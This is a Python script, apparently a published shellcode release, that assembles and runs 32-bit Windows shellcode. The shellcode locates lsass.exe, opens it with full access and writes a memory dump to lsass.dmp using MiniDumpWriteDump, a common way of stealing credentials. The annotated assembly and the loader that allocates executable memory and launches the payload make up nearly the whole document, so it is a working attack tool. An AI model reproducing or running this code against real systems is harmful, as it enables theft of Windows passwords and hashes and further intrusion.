# Author: Lasse Hauballe Jensen (PovlTekstTV)
# Date: 08-29-2021
# Architecture: x86 (32-bit)
# Tested on Windows 10 (32-bit)
# Null byte free
# Size: 423 bytes

import ctypes, struct
from keystone import *

CODE = (
"   start:                              "
"       mov ebp, esp                    ;" # Save ebp for future use
"       add esp, 0xfffffcf0             ;" # ESP is increased to avoid clobbering

"   find_kernel32:                      "  # Find kernel32.dll
"       xor ecx, ecx                    ;" # ECX = 0
"       mov esi,fs:[ecx+30h]            ;" # ESI = &(PEB) ([FS:0x30])
"       mov esi,[esi+0Ch]               ;" # ESI = PEB->Ldr
"       mov esi,[esi+1Ch]               ;" # ESI = PEB->Ldr.InInitOrder

"   next_module:                        "
"       mov ebx, [esi+8h]               ;" # EBX = InInitOrder[X].base_address
"       mov edi, [esi+20h]              ;" # EDI = InInitOrder[X].module_address
"       mov esi, [esi]                  ;" # ESI = InInitOrder[X].flink (next)
"       cmp [edi+12*2], cx              ;" # (unicode) modulename[12] == 0x00?
"       jne next_module                 ;" # No: try next module.

"   find_function_shorten:              "
"       jmp find_function_shorten_bnc   ;" # short jmp

"   find_function_ret:                  "
"       pop esi                         ;"  # POP the return address from the stack 
"       mov [ebp+0x04], esi             ;"  # Save find_function address for later usage
"       jmp resolve_symbols_kernel32    ;"

"   find_function_shorten_bnc:          "
"       call find_function_ret          ;" #Rleative CALL with negative offset (we are jumping backwards)

"   find_function:                      "
"       pushad                          ;" #Save all registers. Also, base address of kernel32 is in EBX from earlier
"       mov eax, [ebx+0x3c]             ;" #Offset to PE Signature
"       mov edi, [ebx+eax+0x78]         ;" #Export Table Directory RVA
"       add edi, ebx                    ;" #Export Table Directory VMA
"       mov ecx, [edi+0x18]             ;" #NumberOfNames
"       mov eax, [edi+0x20]             ;" #AddressOfNames RVA
"       add eax, ebx                    ;" #AddressOfNames VMA
"       mov [ebp-4], eax                ;" #Save AddressOfNames VMA for later

"   find_function_loop:                 "
"       jecxz find_function_finished    ;" #Jump to the end if ECX is 0
"       dec ecx                         ;" #Decrement our names counter
"       mov eax, [ebp-4]                ;" #Restore AddressOfNames VMA
"       mov esi, [eax+ecx*4]            ;" #Get the RVA of the symbol name
"       add esi, ebx                    ;" #Set ESI to the VMA of the current symbol name

"   compute_hash:                       "
"       xor eax, eax                    ;" # Null the EAX register
"       cdq                             ;" # Set EDX to the value of EAX (null)
"       cld                             ;" # Clear the direction flag (DF)

"   compute_hash_again:                 "
"       lodsb                           ;"  # Load the next byte from esi into al
"       test al, al                     ;"  # Check for NULL terminator
"       jz compute_hash_finished        ;"  # IF the ZF is set, we've hit the null
"       ror edx, 0x0d                   ;"  # Rotate edx 13 bits to the right
"       add edx, eax                    ;"  # add the new byte to the accumulator (EDX)
"       jmp compute_hash_again          ;"  # Next iteration

"   compute_hash_finished:              "

"   find_function_compare:              "
"       cmp edx, [esp+0x24]             ;"  # Compare the computed hash with the requested hash
"       jnz find_function_loop          ;"  # If it doesn't match go back to find_function_loop
"       mov edx, [edi+0x24]             ;"  # AddressOfNamesOrdinals RVA
"       add edx, ebx                    ;"  # AddressOfNamesOrdinals VMA
"       mov cx, [edx+2*ecx]             ;"  # Get the value of the AddressOfNamesOrdinals
"       mov edx, [edi+0x1c]             ;"  # AddressOfFunctions RVA
"       add edx, ebx                    ;"  # AddressOfFunctions VMA
"       mov eax, [edx+4*ecx]            ;"  # The Function RVA
"       add eax, ebx                    ;"  # The function VMA
"       mov [esp+0x1c], eax             ;"  # Overwrite stack version of eax from pushad

"   find_function_finished:             "
"       popad                           ;" #Restore registers
"       ret                             ;"

"   resolve_symbols_kernel32:           "
"       push 0x78b5b983                 ;"  # TerminateProcess hash
"       call dword ptr [ebp+0x04]       ;"  # Call find_function
"       mov [ebp+0x10], eax             ;"  # Save TerminateProcess address for later usage
"       push 0xec0e4e8e                 ;"  # LoadLibraryA hash
"       call dword ptr [ebp+0x04]       ;"  # Call find_function
"       mov [ebp+0x14], eax             ;"  # Save address for later usage
"       push 0xe454dfed                 ;"  # CreateToolhelp32Snapshot hash
"       call dword ptr [ebp+0x04]       ;"  # Call find_function
"       mov [ebp+0x18], eax             ;"  # Save address for later usage
"       push 0x4776654a                 ;"  # Process32Next hash
"       call dword ptr [ebp+0x04]       ;"  # Call find_function
"       mov [ebp+0x1c], eax             ;"  # Save address for later usage
"       mov eax, 0x83ffe85b             ;"  # Negated hash for CreateFileA due to null byte (0x7c0017a5)
"       neg eax                         ;"  # Negate back
"       push eax                        ;"  # CreateFileA hash
"       call dword ptr [ebp+0x04]       ;"  # Call find_function
"       mov [ebp+0x20], eax             ;"  # Save address for later usage
"       push 0xefe297c0                 ;"  # OpenProcess hash
"       call dword ptr [ebp+0x04]       ;"  # Call find_function
"       mov [ebp+0x24], eax             ;"  # Save address for later usage

"   load_Dbgcore:                        "
"       mov eax, 0xff93939c             ;" # When negated will become dll\0
"       neg eax                         ;" # NEG EAX
"       push eax                        ;" # push EAX on the stack with string null terminator (EAX is zero)
"       push 0x2e65726f                 ;" # push part of the string on the stack (ore.)
"       push 0x63676264                 ;" # push the second part of the string (dbgc) 
"       push esp                        ;" # Push ESP to have a pointer to the string
"       call dword ptr [ebp+0x14]       ;" # Call LoadLibraryA

"   resolve_symbols_Dbgcore:             "
"       mov ebx, eax                    ;"  # Move the base address of Dbgcore.dll to EBX
"       push 0x79ceb893                 ;"  # MiniDumpWriteDump hash
"       call dword ptr [ebp+0x04]       ;"  # Call find_function
"       mov [ebp+0x28], eax             ;"  # Save address for later usage

"   call_CreateToolhelp32Snapshot:       "
"       xor eax, eax                    ;" 
"       push eax                        ;" # th32ProcessID (zero)
"       inc eax                         ;"
"       inc eax                         ;"
"       push eax                        ;" # dwFlags (0x2 = TH32CS_SNAPPROCESS) 
"       call dword ptr [ebp+0x18]       ;" # Call CreateToolhelp32Snapshot 
"       mov [ebp+0x2c], eax             ;" # Store handle for later

"   create_processentry32:               "
"       xor eax, eax                    ;" # Zero eax
"       push eax                        ;" # szExeFile[MAX_PATH];
"       push eax                        ;" # dwFlags
"       push eax                        ;" # pcPriClassBase
"       push eax                        ;" # th32ParentProcessID
"       push eax                        ;" # cntThreads
"       push eax                        ;" # th32ModuleID
"       push eax                        ;" # th32DefaultHeapID
"       push eax                        ;" # th32ProcessID
"       push eax                        ;" # cntUsage
"       mov eax, 0xfffffed8             ;" # dwSize
"       neg eax                         ;" # NEG EAX
"       push eax                        ;" 
"       push esp                        ;" # Pointer to ProcessEntry32 structure
"       pop ebx                         ;" # Store pointer in ebx... The name of the process is stored at ebx+0x24

"   find_process:                        " # Put lsass.exe on the stack:
"       mov eax, 0xffffff9b             ;" # e + null byte
"       neg eax                         ;"
"       push eax                        ;"
"       mov eax, 0x78652e73             ;" # s.ex
"       push eax                        ;"
"       mov eax, 0x7361736c             ;" # lsas 
"       push eax                        ;"
"       mov [ebp+0x30], esp             ;" # Store pointer to lsass.exe string
"       xor eax, eax                    ;" # Zero eax
"       inc eax                         ;" # Prepare eax for loop
"       cld                             ;" # Clear direction flag
"       jmp compare_process             ;"

"   call_Process32Next:                 "
"       push ebx                        ;"
"       push [ebp+0x2c]                 ;"
"       call dword ptr [ebp+0x1c]       ;" # Call Process32Next 
"       lea edi, [ebx+0x24]             ;" # The processName of the next process

"   is_match:                           "
"       xor ecx, ecx                    ;"
"       mov cl, 0x9                     ;" 
"       mov esi, [ebp+0x30]             ;" # The string to lsass.exe
"       repe cmpsb                      ;" # Compare edi to esi
"       jnz compare_process             ;"
"       mov esi, [ebx+0x8]              ;"
"       mov [ebp+0x34], esi             ;" # The pid of lsass.exe
"       jmp Call_CreateFileA            ;"

"   compare_process:                    "
"       test eax, eax                   ;" # See if we have made it to the end of the list, if not call process32Next again NULL BYTE
"       jnz call_Process32Next          ;"

"   Call_CreateFileA:                    "
"       mov eax, 0xffffff90             ;" #p + null byte
"       neg eax                         ;"
"       push eax                        ;"
"       mov eax, 0x6d642e73             ;" #s.dm 
"       push eax                        ;"
"       mov eax, 0x7361736c             ;" #lsas 
"       push eax                        ;"
"       mov ebx, esp                    ;" # Store pointer to string in ebx
"       xor eax, eax                    ;" 
"       push eax                        ;" # hTemplateFile
"       mov al, 0x80                    ;" # dwFlagsAndAttributes set to FILE_ATTRIBUTE_NORMAL (0x80)
"       push eax                        ;" 
"       xor eax, eax                    ;"
"       inc eax                         ;"
"       inc eax                         ;"
"       push eax                        ;" # dwCreationDisposition set to (0x2)
"       xor eax, eax                    ;" # lpSecurityAttributes
"       push eax                        ;" 
"       push eax                        ;" # dwShareMode
"       mov al, 0x10                    ;"
"       shl eax, 0x18                   ;" # dwDesiredAccess set to GENERIC_ALL (0x10000000)
"       push eax                        ;"
"       push ebx                        ;" # pointer to string
"       call dword ptr [ebp+0x20]       ;" # Call CreateFileA 
"       mov [ebp+0x38], eax             ;" # Save the file handle for later

"   Call_OpenProcess:                    "
"       push [ebp+0x34]                 ;" # dwProcessId (Lsass pid)
"       xor eax, eax                    ;"
"       push eax                        ;" # bInheritHandle (0x0)
"       mov eax, 0xffe0f001             ;" # The value 0x1F0FFF contains null byte so we negate
"       neg eax                         ;"
"       push eax                        ;" # dwDesiredAccess: GENERIC_ALL_ACCESS
"       call dword ptr [ebp+0x24]       ;" # Call OpenProcess
"       mov [ebp+0x3C], eax             ;" # Save handle for lsass.exe 

"   Call_MiniDumpWriteDump:              "
"       xor eax, eax                    ;"
"       push eax                        ;" # CallbackParam
"       push eax                        ;" # UserStreamParam
"       push eax                        ;" # ExceptionParam
"       inc eax                         ;"
"       inc eax                         ;"
"       push eax                        ;" # DumpType (0x2)
"       push [ebp+0x38]                 ;" # hFile: handle to lsass.dmp
"       push [ebp+0x34]                 ;" # ProcessId: PID for lsass.exe 
"       push [ebp+0x3c]                 ;" # hProcess: Handle for lsass.exe
"       call dword ptr [ebp+0x28]       ;" # Call MiniDumpWriteDump

"   call_terminate:                     "
"       xor ecx, ecx                    ;"
"       push ecx                        ;" # uExitCode
"       push 0xffffffff                 ;" # hProcess
"       call dword ptr [ebp+0x10]       ;" # Call TerminateProcess

)

# Initialize engine in X86-32bit mode
try:
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(CODE)
    print("Encoded %d instructions..." % count)

    opcodes = ""
    for dec in encoding:
        opcodes += "\\x{0:02x}".format(int(dec)).rstrip("\n")
    print("size: %d " % len(encoding))
    print("payload = (\"" + opcodes + "\")")

    sh = b""
    for e in encoding:
        sh += struct.pack("B", e)
    shellcode = bytearray(sh)


    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode)),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))

    print("Shellcode located at address %s" % hex(ptr))

    input("...ENTER TO EXECUTE SHELLCODE...")
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.c_int(ptr),
                                            ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.pointer(ctypes.c_int(0)))

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

except KsError as e:
    print("ERROR: %s" %e)
